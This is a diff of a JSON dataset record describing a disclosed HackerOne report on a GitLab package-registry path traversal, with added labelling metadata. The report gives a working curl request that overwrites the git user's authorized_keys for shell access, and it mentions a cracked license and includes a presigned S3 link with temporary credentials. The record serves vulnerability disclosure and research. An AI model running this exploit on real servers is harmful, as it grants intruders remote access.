@@ -1,47 +1,48 @@
 {
-    "reported_to": "GitLab",
-    "reported_by": "saltyyolk ",
-    "title": "Path traversal, to RCE",
-    "content": "\nSummary\nThis one is similar to #732330 but much simpler.\nA path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.\nSteps to reproduce\nEnable package registry in your GitLab instance.\nCreate a project (package registry is enabled by default)\nCreate a private token to call the API\nSend the following request\nCode 302 Bytes\n1curl -H \"Private-Token: $(cat token)\" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub\nThen run ssh git@10.26.0.5 to enjoy a shell.\nExamples\n<image_0>\nIn my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.\nResults of GitLab environment info\nCode 853 Bytes\n1$ gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\t\n5Proxy:\t\tno\n6Current User:\tgit\n7Using RVM:\tno\n8Ruby Version:\t2.6.3p62\n9Gem Version:\t2.7.9\n10Bundler Version:1.17.3\n11Rake Version:\t12.3.3\n12Redis Version:\t3.2.12\n13Git Version:\t2.22.0\n14Sidekiq Version:5.2.7\n15Go Version:\tunknown\n16\n17GitLab information\n18Version:\t12.4.2-ee\n19Revision:\ta3170599aa2\n20Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n21DB Adapter:\tPostgreSQL\n22DB Version:\t10.9\n23URL:\t\thttp://10.26.0.5\n24HTTP Clone URL:\thttp://10.26.0.5/some-group/some-project.git\n25SSH Clone URL:\tgit@10.26.0.5:some-group/some-project.git\n26Elasticsearch:\tno\n27Geo:\t\tno\n28Using LDAP:\tno\n29Using Omniauth:\tyes\n30Omniauth Providers: \n31\n32GitLab Shell\n33Version:\t10.2.0\n34Repository storage paths:\n35- default: \t/var/opt/gitlab/git-data/repositories\n36GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n37Git:\t\t/opt/gitlab/embedded/bin/git\nCode 543 Bytes\n1# my docker-compose.yml\n2version: '3'\n3services:\n4  web:\n5    image: 'gitlab/gitlab-ee:latest'\n6    restart: always\n7    hostname: 'localhost'\n8    environment:\n9      GITLAB_OMNIBUS_CONFIG: |\n10        external_url 'http://10.26.0.5'\n11        gitlab_rails['packages_enabled'] = true\n12    ports:\n13      - '10.26.0.5:80:80'\n14  #    - '10.26.0.5:22:22'\n15    volumes:\n16      - './config:/etc/gitlab'\n17      - './logs:/var/log/gitlab'\n18      - './data:/var/opt/gitlab'\n19      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro\nPlease forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)\nImpact\nThis path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "GitLab",
+  "reported_by": "saltyyolk ",
+  "title": "Path traversal, to RCE",
+  "content": "\nSummary\nThis one is similar to #732330 but much simpler.\nA path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.\nSteps to reproduce\nEnable package registry in your GitLab instance.\nCreate a project (package registry is enabled by default)\nCreate a private token to call the API\nSend the following request\nCode 302 Bytes\n1curl -H \"Private-Token: $(cat token)\" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub\nThen run ssh git@10.26.0.5 to enjoy a shell.\nExamples\n<image_0>\nIn my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.\nResults of GitLab environment info\nCode 853 Bytes\n1$ gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\t\n5Proxy:\t\tno\n6Current User:\tgit\n7Using RVM:\tno\n8Ruby Version:\t2.6.3p62\n9Gem Version:\t2.7.9\n10Bundler Version:1.17.3\n11Rake Version:\t12.3.3\n12Redis Version:\t3.2.12\n13Git Version:\t2.22.0\n14Sidekiq Version:5.2.7\n15Go Version:\tunknown\n16\n17GitLab information\n18Version:\t12.4.2-ee\n19Revision:\ta3170599aa2\n20Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n21DB Adapter:\tPostgreSQL\n22DB Version:\t10.9\n23URL:\t\thttp://10.26.0.5\n24HTTP Clone URL:\thttp://10.26.0.5/some-group/some-project.git\n25SSH Clone URL:\tgit@10.26.0.5:some-group/some-project.git\n26Elasticsearch:\tno\n27Geo:\t\tno\n28Using LDAP:\tno\n29Using Omniauth:\tyes\n30Omniauth Providers: \n31\n32GitLab Shell\n33Version:\t10.2.0\n34Repository storage paths:\n35- default: \t/var/opt/gitlab/git-data/repositories\n36GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n37Git:\t\t/opt/gitlab/embedded/bin/git\nCode 543 Bytes\n1# my docker-compose.yml\n2version: '3'\n3services:\n4  web:\n5    image: 'gitlab/gitlab-ee:latest'\n6    restart: always\n7    hostname: 'localhost'\n8    environment:\n9      GITLAB_OMNIBUS_CONFIG: |\n10        external_url 'http://10.26.0.5'\n11        gitlab_rails['packages_enabled'] = true\n12    ports:\n13      - '10.26.0.5:80:80'\n14  #    - '10.26.0.5:22:22'\n15    volumes:\n16      - './config:/etc/gitlab'\n17      - './logs:/var/log/gitlab'\n18      - './data:/var/opt/gitlab'\n19      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro\nPlease forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)\nImpact\nThis path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 12000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXgzNh2CZ4icp5G6CGRbLqXj?response-content-disposition=attachment%3B%20filename%3D%222019-11-09-195607_1919x386_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272019-11-09-195607_1919x386_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYGNOTUMY%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T024028Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF5fGvQpT7B2%2Fk0Yh9keTF%2FfLwbvhqT98JWEvClFMKMQAiBmdJ%2FcI3ki6GKAd6w2%2B%2FsE89aoOBBvBN2pc%2FeC78Bm2iq7BQj6%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMtfQfu8k1CsW%2Br%2B3cKo8F%2FKwMVhCADjAqfErIOq%2FT1jmJRcHNhp6W0UVlxTEfr9yhFeG9yHrafo8UcV%2FA2doGvdVr2kIrRGlV1YiIkp3JFw9ZlL%2FRUf4riJOAokhCaUlQpWfql547d%2BzYmaq9mT%2BPSu3T0hefYMwrK7cPb4%2FIjTH2jJHQCzJguVRxmCJONXRciulSGKMmMnY0EUGLsMnaalDcr8VnjywavAetM%2BCFTLQ%2FC427VviAmkO%2BR%2B38f4bqeD9q7o83qijkUe8CBBDJ7j0Z1zXdw8%2Brh1cVO8%2FVe3YH1EoDEPObdlKJy2stpMMBLY480qdYgcIXVs7q9ujuwKUAQlOyn%2BRRDA0uf1sFA36zvIM%2BaBOBtFcxIgMcGRb%2BarrTU6SkmiaQP1ISnEZ1pSssJVGyPoPTEsfYk3X4Y6l%2BOImElexmdlwlK1PchGWu4wbb9w6p8Pw7fKgEDLUNcMAdm3HzPOg7%2BdgbssE%2FeWD23%2B2xr8icMkWqvbcd%2FWVRwAr0FesjGDwbOyWF8Oqb2JQnSeOCoWOsP4so6k32kxkBSzlfzJpz27XKxNc0IqdGH6cZlXPNmzvUJ%2Bpu7D4EUBtNUjMuR3HaJ%2FrKuu2Ee11A8uFOszj%2B54lBn6FOwxayUZgKy%2BOU%2FPQQZ%2FITaDNAPi3mibvtOTYf0onhO69wIu3uzeDIRkCK6pMVHM65HjU%2BNALBFUONAz9f87krPMom28ECqxwy08guAL%2BE1cDisgJockC8rYYO%2F3ww0iDiuqx2jXlt1oKNfdRT5ySXApwVWmp6%2FuTwxiUdnUSN1Sr28QGdZYnt0P0gp6RHSbjgpLhq4s%2BMcifo6Ov0xQGC10SaK2q8ped0BOSOiQqK9o1K0M7OloAPMSvYe%2Bkg8HcmcTCc%2BIe%2FBjqyAWiIi2qvkTKu10jyjIuc62KYUPkU%2BI5coUapfWQWE48JULRxCH2HGb78T2AhJfQKWSByftivekPAWT3NNrHCoCdYAV3bRei9zgbkGr7fukG6%2FUS97EcBg%2FhfGgUgLz7w4wGS3KQk4Bng91lDPoAypmizDUYCxXJQoW43uSF83d1rPpivs%2F3TOBFPeMx34RWvYkaOpGXjBta3Ix5p9NNaLFR5e%2Fb3XNEejzWux9u8C7WaRyg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33b78e38c52cd98acee142eceab53f13231199f922aa502445d15985efc3530e"
+  },
+  "disclosed_date": 1654625760,
+  "report_url": "https://hackerone.com/reports/733072",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Enable package registry in your GitLab instance and create a project (package registry is enabled by default)."
     ],
-    "bounty": 12000,
-    "weaknesses": [
-        "Command Injection - Generic"
-    ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXgzNh2CZ4icp5G6CGRbLqXj?response-content-disposition=attachment%3B%20filename%3D%222019-11-09-195607_1919x386_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272019-11-09-195607_1919x386_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYGNOTUMY%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T024028Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF5fGvQpT7B2%2Fk0Yh9keTF%2FfLwbvhqT98JWEvClFMKMQAiBmdJ%2FcI3ki6GKAd6w2%2B%2FsE89aoOBBvBN2pc%2FeC78Bm2iq7BQj6%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMtfQfu8k1CsW%2Br%2B3cKo8F%2FKwMVhCADjAqfErIOq%2FT1jmJRcHNhp6W0UVlxTEfr9yhFeG9yHrafo8UcV%2FA2doGvdVr2kIrRGlV1YiIkp3JFw9ZlL%2FRUf4riJOAokhCaUlQpWfql547d%2BzYmaq9mT%2BPSu3T0hefYMwrK7cPb4%2FIjTH2jJHQCzJguVRxmCJONXRciulSGKMmMnY0EUGLsMnaalDcr8VnjywavAetM%2BCFTLQ%2FC427VviAmkO%2BR%2B38f4bqeD9q7o83qijkUe8CBBDJ7j0Z1zXdw8%2Brh1cVO8%2FVe3YH1EoDEPObdlKJy2stpMMBLY480qdYgcIXVs7q9ujuwKUAQlOyn%2BRRDA0uf1sFA36zvIM%2BaBOBtFcxIgMcGRb%2BarrTU6SkmiaQP1ISnEZ1pSssJVGyPoPTEsfYk3X4Y6l%2BOImElexmdlwlK1PchGWu4wbb9w6p8Pw7fKgEDLUNcMAdm3HzPOg7%2BdgbssE%2FeWD23%2B2xr8icMkWqvbcd%2FWVRwAr0FesjGDwbOyWF8Oqb2JQnSeOCoWOsP4so6k32kxkBSzlfzJpz27XKxNc0IqdGH6cZlXPNmzvUJ%2Bpu7D4EUBtNUjMuR3HaJ%2FrKuu2Ee11A8uFOszj%2B54lBn6FOwxayUZgKy%2BOU%2FPQQZ%2FITaDNAPi3mibvtOTYf0onhO69wIu3uzeDIRkCK6pMVHM65HjU%2BNALBFUONAz9f87krPMom28ECqxwy08guAL%2BE1cDisgJockC8rYYO%2F3ww0iDiuqx2jXlt1oKNfdRT5ySXApwVWmp6%2FuTwxiUdnUSN1Sr28QGdZYnt0P0gp6RHSbjgpLhq4s%2BMcifo6Ov0xQGC10SaK2q8ped0BOSOiQqK9o1K0M7OloAPMSvYe%2Bkg8HcmcTCc%2BIe%2FBjqyAWiIi2qvkTKu10jyjIuc62KYUPkU%2BI5coUapfWQWE48JULRxCH2HGb78T2AhJfQKWSByftivekPAWT3NNrHCoCdYAV3bRei9zgbkGr7fukG6%2FUS97EcBg%2FhfGgUgLz7w4wGS3KQk4Bng91lDPoAypmizDUYCxXJQoW43uSF83d1rPpivs%2F3TOBFPeMx34RWvYkaOpGXjBta3Ix5p9NNaLFR5e%2Fb3XNEejzWux9u8C7WaRyg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33b78e38c52cd98acee142eceab53f13231199f922aa502445d15985efc3530e"
-    },
-    "disclosed_date": 1654625760,
-    "report_url": "https://hackerone.com/reports/733072",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Enable package registry in your GitLab instance and create a project (package registry is enabled by default)."
-        ],
-        [
-            2,
-            "Create a private token to call the API and send a crafted request with path traversal to write a file (e.g., authorized_keys) to a sensitive location."
-        ]
-    ],
-    "vuln_description": "A path traversal vulnerability in GitLab's package registry API allows an attacker to write arbitrary files to any location writable by the GitLab user, potentially leading to remote code execution by overwriting critical files like authorized_keys.",
-    "reason": "The vulnerability involves a straightforward path traversal attack with no complex interactions or state manipulations required. The attack vector is well-known and the steps to exploit are simple and linear.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": "732330",
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves a path traversal issue in the GitLab package registry API, which allows an attacker to write arbitrary files to locations writable by the GitLab user. This is detectable because the methodology involves testing for unauthorized access to resources (files in this case) by manipulating paths (resource_ids) and testing with different user sessions (authenticated or unauthenticated). The action (file write via API) and resource_id (file path) can be extracted from the HTTP requests, and the test would involve substituting the path with traversal sequences to check for unauthorized access.",
-        "is_detectable": true
-    }
+    [
+      2,
+      "Create a private token to call the API and send a crafted request with path traversal to write a file (e.g., authorized_keys) to a sensitive location."
+    ]
+  ],
+  "vuln_description": "A path traversal vulnerability in GitLab's package registry API allows an attacker to write arbitrary files to any location writable by the GitLab user, potentially leading to remote code execution by overwriting critical files like authorized_keys.",
+  "reason": "The vulnerability involves a straightforward path traversal attack with no complex interactions or state manipulations required. The attack vector is well-known and the steps to exploit are simple and linear.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "732330",
+  "injection_metadata": {
+    "reasoning": "The vulnerability involves a path traversal in a URL parameter (directory structure) using URL-encoded '../' sequences. The methodology's 'simple payload' approach could detect this if the payload list includes basic path traversal patterns and the tool tests URL path parameters. However, the exploit requires non-normalized path handling (--path-as-is) and writes files without direct same-channel feedback, making detection through regular response analysis challenging. The payload format matches simple encoding patterns but requires specific context to exploit.",
+    "is_simple_injection": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a path traversal issue in the GitLab package registry API, which allows writing files to arbitrary locations. This can be detected by analyzing HTTP requests that manipulate file paths (resource_ids) and testing with different user sessions (AuthZ) or unauthenticated sessions (AuthN). The methodology covers this by testing actions with different resource_ids and user sessions.",
+    "is_detectable": true
+  }
 }
